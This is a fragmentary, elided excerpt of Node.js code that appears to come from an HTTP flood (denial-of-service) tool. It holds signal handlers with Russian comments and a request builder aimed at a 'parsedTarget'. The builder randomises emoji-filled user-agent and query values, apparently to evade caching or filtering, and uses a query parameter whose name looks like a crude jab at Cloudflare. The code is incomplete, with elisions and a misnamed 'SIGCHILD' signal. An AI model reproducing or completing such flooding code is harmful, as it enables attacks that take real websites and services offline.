...
process.on('SIGINT', () => {
  // Здесь выполняется код для завершения всех связанных процессов
  process.exit();
});
process.on('SIGCHILD', () => {
  // Здесь выполняется код для завершения всех связанных процессов
...
HTTP(options, callback) {
  ...
  const userAgentString = "\u{1F3FF}".repeat(randomInt(10,30));
  const userAgentBuffer = Buffer.from(userAgentString);
 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":path"] = parsedTarget.path + '?'+ 'cfmamyebal' +'=' + userAgentBuffer;
 ...
 headers["user-agent"] = userAgentBuffer;
